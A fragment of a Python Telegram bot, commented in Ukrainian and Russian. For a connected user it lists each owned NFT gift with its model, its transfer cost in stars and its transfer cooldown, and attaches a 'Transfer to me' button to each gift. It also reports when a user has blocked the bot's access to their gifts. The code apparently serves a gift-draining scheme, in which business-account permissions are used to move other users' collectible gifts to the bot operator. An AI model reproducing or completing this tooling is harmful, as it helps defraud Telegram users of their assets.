                            logging.info(f"Повна помилка STARGIFT_TRANSFER_TOO_EARLY для подарунка {gift.owned_gift_id}: {str(e)}")
                            if "STARGIFT_TRANSFER_TOO_EARLY" in str(e):
                                match = re.search(r"STARGIFT_TRANSFER_TOO_EARLY_(\d+)", str(e))
                                if match:
                                    cooldown_end = int(match.group(1))
                                    current_time = datetime.datetime.now()
                                    if cooldown_end < current_time.timestamp():
                                        cooldown_end_time = current_time + datetime.timedelta(seconds=cooldown_end)
                                    else:
                                        cooldown_end_time = datetime.datetime.fromtimestamp(cooldown_end)
                                    remaining_time = cooldown_end_time - current_time
                                    remaining_days = max(0, remaining_time.days)
                                    remaining_hours = max(0, remaining_time.seconds // 3600)
                                    remaining_minutes = max(0, (remaining_time.seconds % 3600) // 60)
                                    remaining_str = f"{remaining_days} дн., {remaining_hours} год., {remaining_minutes} хв."
                                    cooldown_info = (
                                        f"\n⏳ Кулдаун закінчується: {cooldown_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                        f"⏰ Залишилось: {remaining_str}"
                                    )
                                else:
                                    cooldown_info = "\n⏳ Трансфер недоступний через кулдаун. Час не вказано."
                            elif "PEER_ID_INVALID" in str(e):
                                cooldown_info = f"\n⚠️ Некоректний SENDER_ID ({SENDER_ID}). Користувач може не взаємодіяти з ботом."
                            else:
                                cooldown_info = f"\n⚠️ Помилка перевірки кулдауну: {e}"
                                logging.error(f"Помилка перевірки кулдауну для подарунка {gift.owned_gift_id}: {e}")
                        except Exception as e:
                            cooldown_info = f"\n⚠️ Непередбачена помилка перевірки кулдауну: {e}"
                            logging.error(f"Непередбачена помилка перевірки кулдауну для подарунка {gift.owned_gift_id}: {e}")
                    else:
                        cooldown_info = f"\n⚠️ Неможливо перевірити кулдаун через некоректний SENDER_ID ({SENDER_ID})."

                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"🎁 <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"�ID Модель: <code>{gift.gift.model.name}</code>\n\n\n⭐ Стоимость трансфера: {gift.transfer_star_count} ⭐"
                        f"{cooldown_info}"
                    )
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🎁 Передать мне",
                                              callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}")]
                    ])
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
            logging.error(f"Помилка при отриманні подарунків: {e}")
    except Exception as e:
        logging.exception("Ошибка при получении данных по бизнесу")
        await callback.message.answer(f"Ошибка: {e}")

async def main():
    print("💖 Сделано с любовью by @sqvvinf")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())